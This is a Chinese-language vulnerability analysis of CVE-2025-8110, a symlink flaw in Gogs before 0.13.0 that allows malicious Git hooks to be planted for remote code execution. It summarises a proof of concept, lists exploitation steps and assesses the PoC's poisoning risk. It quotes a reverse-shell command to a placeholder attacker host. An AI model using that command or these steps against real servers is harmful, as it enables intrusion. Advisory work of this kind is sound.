## CVE-2025-8110 - Gogs 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Gogs

**危害等级:** 高危

**CVSS评分:** 8.7

**影响版本:** Gogs versions prior to 0.13.0

**利用条件:** 需要认证 (push 权限)，在默认开放注册配置下易于获取权限

**POC 可用性:** 7

**POC 类型:** 概念验证

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-8110是一个针对Gogs（一个用Go语言编写的自助Git服务）的高危远程代码执行（RCE）漏洞。该漏洞的根源在于Gogs在处理符号链接（symbolic links）时存在的缺陷，特别是其PutContents API和Git hook机制的验证逻辑存在不足。攻击者可以利用这一缺陷，通过创建指向敏感目录（如`.git`目录）的恶意符号链接，绕过Gogs的文件写入和验证限制。一旦成功绕过，攻击者能够将任意文件写入到服务器的任意位置，包括覆盖关键配置文件或植入恶意的Git hooks脚本，例如`post-receive` hook。一旦恶意hook被植入并具有执行权限，任何对受影响仓库的后续push操作都将触发该hook的执行，从而在Gogs服务器上以Gogs进程的权限执行攻击者指定的任意系统命令。该漏洞的CVSS评分高达8.7，且根据威胁情报，此漏洞已存在在野利用（in-the-wild exploitation），对Gogs用户构成严重威胁。受影响的版本主要为Gogs 0.13.0之前的版本。利用此漏洞通常需要攻击者拥有对Git仓库的push权限，但如果Gogs实例启用了默认的开放注册功能，则获取用户权限的门槛将大大降低，从而增加了漏洞的易利用性。

**POC有效性分析:**
所提供的概念验证（POC）代码由三个文件组成：`README.md`、`bash.sh`和`exploit.py`。这些文件协同工作，清晰地演示了该漏洞的核心利用机制。
*   `README.md`文件简要介绍了漏洞类型，明确指出这是一个影响Gogs 0.13.0版本之前软件的Git hook机制中的命令注入漏洞，最终可导致远程代码执行。这与通过搜索结果收集到的信息高度吻合，确认了漏洞的攻击面。
*   `bash.sh`文件提供了一个典型的恶意`post-receive` hook脚本内容。该脚本的主要功能是建立一个反向Shell (`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &`)，这将使Gogs服务器主动连接到攻击者控制的`attacker.com`上的`4444`端口，并将Shell的输入输出重定向到该连接，从而赋予攻击者对服务器的远程命令执行能力。这是一个标准且功能完整的RCE payload示例。
*   `exploit.py`文件是一个Python脚本，其作用是模拟恶意Git hook的植入过程。它首先在本地文件系统上创建一个名为`/tmp/malicious_repo`的模拟Git仓库结构，包括其`.git/hooks`目录。接着，它将一个简化的恶意`post-receive` hook脚本内容 (`bash -c "id > /tmp/gogs_exploited"`) 写入到模拟仓库的`.git/hooks/post-receive`文件中。最后，它使用`chmod +x`命令为该hook脚本添加执行权限。
虽然`exploit.py`并未直接实现与远程Gogs服务器的交互（例如通过HTTP请求或Git push），但它非常有效地展示了恶意hook的内容以及其在文件系统中的预期位置和权限。这个POC的核心在于展示了如何在`.git/hooks`目录下放置并激活一个恶意脚本，而搜索结果中提到的符号链接绕过机制正是实现远程文件写入到此敏感位置的关键。因此，该POC在概念上是高度有效的，它完整地展现了实现远程代码执行所需的最终恶意载荷和文件操作。攻击者只需将`exploit.py`中的本地文件操作逻辑替换为利用符号链接缺陷实现远程任意文件写入的实际网络请求，即可将其转换为一个功能完整的远程漏洞利用工具。

**利用步骤:**
1.  **权限获取**: 攻击者首先需要获得一个Gogs服务器上的有效用户凭证，并拥有对至少一个Git仓库的push权限。值得注意的是，如果Gogs实例配置了开放注册，攻击者可以轻易地注册新账户以满足这一前置条件。
2.  **构造恶意Payload**: 攻击者需要构造一个包含恶意命令的Git `post-receive` hook脚本。这些命令可以是任意系统命令，例如建立反向Shell、下载并执行恶意程序，或者修改系统配置等。POC中的`bash.sh`文件提供了一个有效的反向Shell示例。
3.  **利用符号链接缺陷**: 这是漏洞利用的关键步骤。攻击者需要利用Gogs对符号链接处理不当的缺陷（可能通过PutContents API或其他Git操作），将步骤2中构造的恶意hook脚本文件写入到目标Git仓库的`.git/hooks/post-receive`路径。此步骤绕过了Gogs正常的文件上传或写入限制，允许攻击者控制服务器上的敏感文件。
4.  **赋予执行权限**: 确保写入的`post-receive` hook文件具有可执行权限。在某些利用场景下，这可能随文件写入一并完成，或者需要额外的操作。
5.  **触发执行**: 一旦恶意`post-receive` hook文件成功植入并被设置为可执行，攻击者或任何其他用户对该受影响的Git仓库执行一次push操作时，该恶意hook脚本便会在Gogs服务器上自动执行，从而实现攻击者预期的远程代码执行效果。

**投毒风险分析:**
所提供的POC代码在投毒风险方面评估为低风险（约10%）。这一评估基于以下几个关键因素：
*   **代码透明度和可读性**: `exploit.py`和`bash.sh`两个文件都非常简洁、清晰且易于理解。`exploit.py`使用标准的Python库函数（如`os.makedirs`, `open`, `subprocess.run`）进行本地文件系统操作，没有任何混淆或复杂的逻辑。`bash.sh`则是一个直接的反向Shell脚本。代码中没有使用任何模糊处理、编码或加密技术来隐藏其真实意图。
*   **无外部依赖或额外网络请求**: `exploit.py`脚本在执行过程中不涉及任何外部网络请求，也不会尝试从第三方URL下载或执行任何额外的代码或组件。它所有的操作都局限在本地文件系统模拟环境。`bash.sh`虽然包含一个连接到`attacker.com`的指令，但这是作为漏洞演示本身的一部分，旨在展示RCE的后果，而非POC代码自身携带的恶意行为。`attacker.com`是一个占位符，需要攻击者自行替换为真实IP地址。
*   **无隐藏恶意负载**: POC代码的主要功能是演示如何构造和放置一个恶意的Git hook。它没有嵌入任何与漏洞利用无关的、具有破坏性或间谍性质的恶意负载，例如勒索软件、加密货币挖矿程序、信息窃取木马等。脚本中执行的命令 (`id > /tmp/gogs_exploited` 或反向Shell) 是直接为了证明命令执行能力而设计的。
*   **目的明确性**: 整个POC的目的非常明确，即帮助安全研究人员和防御者理解CVE-2025-8110的工作原理及其利用方式。它是一个纯粹的概念验证工具，旨在教育和防御，而非用于实际攻击。

综上所述，该POC代码是安全、透明的，仅用于合法防御性安全研究和测试，其内部不包含任何意外的恶意功能，因此投毒风险极低。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
